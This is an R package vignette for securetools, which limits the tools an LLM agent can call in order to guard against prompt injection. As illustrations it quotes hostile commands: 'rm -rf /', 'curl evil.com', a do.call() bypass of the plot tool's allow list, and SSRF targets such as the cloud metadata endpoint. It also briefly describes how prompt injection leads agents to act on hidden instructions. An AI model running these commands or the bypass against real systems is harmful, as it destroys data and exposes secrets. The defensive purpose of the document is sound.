Getting started with securetools

Source: vignettes/securetools.Rmd
securetools.Rmd

Why tools need limits

A tool you give an LLM agent is code the model can run whenever it decides to. If the model can call system(), it can run any shell command. If it can write files anywhere, it can overwrite something you care about. If it can send raw SQL, it can drop a table or read every row.

The model doesn’t have to be badly behaved for this to go wrong. Prompt injection works by hiding instructions in data the agent reads: a CSV it was asked to summarize, a web page it fetched, a column name in a query result. Agents often follow those instructions. If the tools have no limits, one successful injection is enough to do real damage.

securetools has ready-made tools for securer with the limits built in. The file tools can’t reach outside the folders you list. The SQL tool takes a table, columns, and a filter, and writes the query itself. The URL tool only talks to the domains you allow.

Each tool_*() function returns a securer::securer_tool() object, which you pass to a SecureSession.

How a tool call runs

Validation happens in your main R session (the parent process), not in the sandbox.

  LLM Agent                 Parent Process (R)              Sandbox (securer)
  =========                 ==================              =================
      |                            |                               |
      |--- tool_call(args) ------->|                               |
      |                            |                               |
      |                     1. Validate args:                      |
      |                        - Check rate limit                  |
      |                        - Resolve symlinks                  |
      |                        - Match allow-lists                 |
      |                        - Verify size limits                |
      |                            |                               |
      |                     2. Reject? -----> Error to LLM         |
      |                            |                               |
      |                     3. Pass validated -------> Execute     |
      |                        call to sandbox         in sandbox  |
      |                            |                               |
      |                            |<------------- Result ---------|
      |                            |                               |
      |<--- result/error ----------|                               |

When code in the sandbox calls a tool, securer sends the call to the parent. The parent checks the arguments and, if they pass, runs the tool’s function and sends the result back. Because both the checks and the tool itself run in the parent, code in the sandbox can’t change or skip them.

Installation 

# install.packages("pak")
pak::pak("ian-flores/securetools")

The tools 

library(securetools)
library(securer)

Calculator

If you hand a model a calculator that just evaluates R, nothing stops it from sending calculator(expression = "system('rm -rf /')").

tool_calculator() parses the expression and walks the parse tree before running anything. Every function and name has to be on a short list of arithmetic and math functions. Variables, assignment, and any other function call are rejected, and nothing is evaluated.

calc <- tool_calculator()
session <- SecureSession$new(tools = list(calc))

session$execute('calculator(expression = "sqrt(144) + 2^3")')
#> [1] 20

# Rejected: system() isn't on the list
session$execute('calculator(expression = "system(\'whoami\')")')
#> Error: Function not allowed in calculator: `system()`

session$close()

Reading and writing files

An agent that can read any file can read ~/.ssh/id_rsa or a .env file. One that can write anywhere can fill the disk or replace files outside the project. Paths like ../../ and symlinks are the usual ways out of a folder.

tool_read_file() and tool_write_file() take a list of allowed folders. Paths are resolved, symlinks included, before they’re compared with that list. Both tools have a size limit, and the writer won’t overwrite an existing file unless you set overwrite = TRUE. Reading and writing are set up separately, so you can let an agent read from one folder and write only to another.

# Only allow access to a specific directory
data_dir <- "/path/to/project/data"

reader <- tool_read_file(
  allowed_dirs = data_dir,
  max_file_size = "50MB",
  max_rows = 10000
)

writer <- tool_write_file(
  allowed_dirs = data_dir,
  max_file_size = "10MB",
  overwrite = FALSE
)

session <- SecureSession$new(tools = list(reader, writer))

# Read a CSV (auto-detects format from extension)
session$execute('
  data <- read_file(path = "/path/to/project/data/input.csv", format = "auto")
  head(data)
')

# Write results (path traversal is blocked)
session$execute('
  result <- data.frame(x = 1:5, y = letters[1:5])
  write_file(
    path = "/path/to/project/data/output.csv",
    content = result,
    format = "csv"
  )
')

session$close()

SQL queries

If an agent can send raw SQL, a prompt injection can get it to run DROP TABLE, a UNION SELECT that pulls data from other tables, or an UPDATE. Parameterized queries help, but only when every query uses them correctly.

tool_query_sql() doesn’t take SQL at all. The agent names a table, the columns it wants, and an optional filter, and the tool builds the query. The filter value is sent as a query parameter, never pasted into the SQL:

  Agent Request                           Tool Internals
  =============                           ==============
  table = "users"             --->   SELECT name, email
  columns = "name, email"           FROM users
  filter_column = "active"          WHERE active = ?
  filter_value = "1"                 [bound: "1"]

The table has to be in allowed_tables. Column names aren’t checked against a list, but they must be plain identifiers (letters, digits, and underscores), and table and column names are quoted with DBI::dbQuoteIdentifier(). Results are capped at max_rows.

library(DBI)
con <- dbConnect(RSQLite::SQLite(), "app.db")

sql_tool <- tool_query_sql(

  conn = con,
  allowed_tables = c("users", "orders"),
  max_rows = 1000
)

session <- SecureSession$new(tools = list(sql_tool))

# Query with filter (uses parameterized query internally)
session$execute('
  query_sql(
    table = "users",
    columns = "name, email",
    filter_column = "active",
    filter_value = "1"
  )
')

session$close()
dbDisconnect(con)

Fetching URLs

With open network access, an agent can reach services that aren’t meant to be public, like a cloud metadata endpoint at http://169.254.169.254 or an internal API on http://localhost:8080. This is server-side request forgery (SSRF). It can also send data out to a server an attacker controls, or hit an API in a loop.

tool_fetch_url() only allows GET and HEAD over HTTP or HTTPS. The host must match allowed_domains, where *.example.com matches any subdomain of example.com but not example.com itself. The tool looks up the host’s IP address once, refuses private and loopback addresses (and all IPv6 addresses), and then connects to that address so a second DNS answer can’t send it somewhere else. It doesn’t follow redirects, and it caps the response size and the number of calls per minute.

HTTPS requests currently fail. Connecting by IP address breaks the TLS certificate check, so the example below errors until that is fixed. Plain HTTP works.

fetcher <- tool_fetch_url(
  allowed_domains = c("api.github.com", "*.githubusercontent.com"),
  max_response_size = "1MB",
  timeout_secs = 30,
  max_calls_per_minute = 10
)

session <- SecureSession$new(tools = list(fetcher))

session$execute('
  result <- fetch_url(url = "https://api.github.com/zen", method = "GET")
  result$body
')

session$close()

Profiling data

Summarizing a very large data frame can use a lot of memory. tool_data_profile() profiles a random sample of max_rows rows when the data is bigger than that, and says in its result that it sampled.

profiler <- tool_data_profile(max_rows = 100000)
session <- SecureSession$new(tools = list(profiler))

session$execute('
  profile <- data_profile(data = iris)
  profile$columns[[1]]  # Sepal.Length stats
')

session$close()

Plots

Plotting code is still R code. plot(x); system("curl evil.com") looks like a plot but also runs a shell command.

tool_plot() parses the code first and rejects any function that isn’t on its list of graphics, math, and data functions. That check is weaker than it sounds; see the known limitations below. The plot is written to a temporary file, checked against max_file_size, and then copied to a path inside allowed_dirs.

At the moment only plot() itself works. The code runs with only the base package visible, so functions from graphics such as hist(), lines(), and barplot() aren’t found, and the example below fails until that is fixed.

plotter <- tool_plot(
  allowed_dirs = "/path/to/output",
  max_file_size = "5MB"
)

session <- SecureSession$new(tools = list(plotter))

session$execute('
  plot(
    path = "/path/to/output/chart.png",
    plot_code = "hist(rnorm(1000), main = \"Distribution\")",
    width = 8,
    height = 6,
    format = "auto"
  )
')

session$close()

R help

Looking up help pages seems harmless, but it tells the agent which packages you have installed. tool_r_help() only returns pages from the packages in allowed_packages, and cuts each page off at max_lines lines.

help_tool <- tool_r_help(allowed_packages = c("base", "stats", "utils"))

session <- SecureSession$new(tools = list(help_tool))

# Look up documentation for a function
result <- session$execute('r_help(topic = "mean", package = "base")')
cat(result)

session$close()

What the tools protect against

The checks run in the parent process. Here is what each one is for:

  • Reading secret files: paths are resolved, symlinks included, and must be inside an allowed folder.
  • Writing to the wrong place: write paths are checked the same way, and checked again after the file is written.
  • Running arbitrary code: the calculator and plot tools reject functions that aren’t on their lists (the plot tool has a known gap, below).
  • Reaching internal services: the URL tool only allows HTTP and HTTPS, allowed domains, and public IP addresses.
  • SQL injection: the agent never writes SQL, and filter values are passed as parameters.
  • Runaway use: every tool has an optional call limit, and the file, plot, and URL tools have size limits.

Known limitations

  • Between checking a path and writing to it, someone with access to the folder could swap in a symlink. The write and plot tools check the path again after writing and delete the file if it ended up outside the allowed folders, but the write has already happened by then.
  • Call limits live in memory. They reset when the R process restarts. If you need limits that last, enforce them outside R.
  • The plot tool is not safe for untrusted code yet. Its allow list includes do.call(), and the code runs with base R visible, so do.call("system", list("ls")) gets past the check and runs. Until this is fixed, only use tool_plot() inside a sandboxed session.
  • tool_fetch_url() can’t fetch HTTPS URLs yet (see above).
  • Passing a data frame the size of iris or mtcars to data_profile() from inside a SecureSession currently fails while the data is sent between processes. Small data frames work, and calling the tool directly with profiler@fn(iris) works.

Calling tools through a SecureSession

Inside a SecureSession, the tool functions don’t keep the default argument values from the factory. Pass every argument, even ones with a default like format = "auto".

Call limits

An agent loop keeps calling tools until the model decides it’s done or runs out of tokens. A confused or manipulated agent can make thousands of calls. A call limit stops it no matter what the model decides.

Every tool takes max_calls, a limit on the total number of calls. tool_fetch_url() also takes max_calls_per_minute. When a limit is reached, the tool raises an error, and the agent can see that error and change course.

# Allow only 100 calculator evaluations per session
calc <- tool_calculator(max_calls = 100)

# URL fetch with both lifetime and per-minute limits
fetcher <- tool_fetch_url(
  allowed_domains = "api.github.com",
  max_calls = 1000,
  max_calls_per_minute = 10
)

All tools

Function Limits
tool_calculator() Allowed functions only; rejects anything else before evaluating
tool_data_profile() Samples rows from large data
tool_read_file() Allowed folders, size cap, row cap
tool_write_file() Allowed folders, size cap, no overwriting by default
tool_query_sql() Allowed tables, no raw SQL, parameterized filters
tool_fetch_url() Allowed domains, no private IPs, size cap, calls per minute
tool_plot() Allowed functions, allowed folders, size cap
tool_r_help() Allowed packages, line cap
